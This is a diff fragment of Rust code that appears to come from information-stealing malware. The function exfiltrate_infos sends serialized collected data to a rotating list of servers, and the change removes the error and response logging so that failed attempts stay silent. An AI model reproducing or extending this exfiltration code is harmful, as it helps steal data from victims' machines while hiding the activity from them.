@@ -11,12 +11,11 @@ pub fn exfiltrate_infos(infos: HashMap<String, String>) -> Result<(), &'static s
     loop {
         // send the serialized infos to the server
         match try_server(servers[curr_try], &serialized_infos) {
-            Ok(response) => {
-                println!("Response: {}", response.status());
+            Ok(_) => {
+                println!("Successfully sent the infos to the server");
                 break;
             }
-            Err(error) => {
-                println!("Error: {} Retrying in 5 seconds...", error);
+            Err(_) => {
                 fail_count += 1;
                 if fail_count == servers.len() {
                     return Err("All servers failed");
